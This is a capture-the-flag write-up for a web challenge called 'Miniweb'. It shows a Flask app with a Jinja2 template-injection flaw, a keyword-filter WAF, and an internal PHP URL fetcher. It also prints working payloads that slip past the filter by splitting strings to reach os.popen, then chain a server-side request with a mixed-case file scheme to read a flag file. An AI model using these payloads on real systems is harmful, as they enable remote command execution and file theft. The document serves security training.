---
description: SSTI + SSRF challenge
---

# Miniweb

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

given a link with the source code

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

nothing interesting in the actual web. Then I proceed to investigate the source code

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

there are two folders with these files inside. These are the important files

front-server/app.py:

```python
from flask import Flask, request, render_template
from jinja2 import Template
import waf

app = Flask(__name__)

@app.route("/")
def index():

    name = request.args.get("name", "")
    return render_template("index.html", name=name)

@app.route('/sub')
def sub():
    if request.args.get("name", "") :
        try :
            name = request.args.get("name", "").strip()
            print(waf.sanitize_input(name))
            return Template(waf.sanitize_input(f"{name} has subscribed successfully")).render()
        except :
            return "error"

if __name__ == "__main__":
    app.run(debug=False,port=12345)
```

front-server/waf.py:

```python
import re


def sanitize_input(input_string):

    input_string = re.sub(r"<script.*?>.*?</script>", "", input_string, flags=re.IGNORECASE)

    sql_patterns = [
        r"(--|#|;|\b(select|drop|insert|delete|update|union|or)\b)",
        r"(\b(0x[a-fA-F0-9]{2,8})\b)",
    ]

    for pattern in sql_patterns:
        input_string = re.sub(pattern, "BLOCKED", input_string)

    dangerous_chars = r"[+<>$%&\";]"
    for dc in dangerous_chars:
        input_string = input_string.replace(dc, "BLOCKED")

    dangerous_patterns = [
        r"(\b[a-zA-Z]'\s*'[a-zA-Z]\b)"
    ]

    for pattern in dangerous_patterns:
        input_string = re.sub(pattern, "BLOCKED", input_string)

    command_injections = ['subprocess', 'os', 'command', 'system', '\\','pty','eval','exec','sys', 'lower','upper', 'from', 'Popen','popen','read','run','check_output','execv','call','execvp','execle']
    for cmd in command_injections:
        input_string = input_string.replace(cmd, "BLOCKED")

    if "BLOCKED" in input_string :
        return "Blocked By WAF"
    else :
        return input_string
```

internal-server/src/index.php:

```php
<?php
if (!isset($_GET['url'])) {
    die("Missing 'url' parameter.");
}

$url = $_GET['url'];

$parsed = parse_url($url);
if (in_array($parsed['scheme'], [
    'ftp',
    'ftps',
    'file',
    'php',
    'zlib',
    'data',
    'glob',
    'phar',
    'ssh2',
    'rar',
    'ogg',
    'expect',
    'zip'
])) {
    die("Invalid URL scheme.");
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);

$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo "cURL error: " . curl_error($ch);
} else {
    echo htmlspecialchars($response);
}

curl_close($ch);
?>
```

looking at these source code, I see there's a SSTI vulnerability in app.py at this part

```python
f"{name} has subscribed successfully"
```

which then will be sanitized by waf.py.

so to confirm this I put&#x20;

```python
/sub?name={{7*7}}
```

to the endpoint

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

and it worked. So I crafted a payload that bypasses all the waf

```python
/sub?name={{joiner.__init__.__globals__.__builtins__.__import__('o'~'s')|attr('po'~'pen')('ls')|attr('re'~'ad')()}}
```

and it worked!

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

then I just need to modify the payload to read flag.txt file from internal-server

so the final payload:

```python
/sub?name={{joiner.__init__.__globals__.__builtins__.__import__('o'~'s')|attr('po'~'pen')('curl php_internal:9000?url=FiLe:///flag.txt')|attr('re'~'ad')()}}
```

and got the flag

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

#### Flag: hacktoday{karena\_roti\_lebih\_enak\_dari\_kunci\_gang}
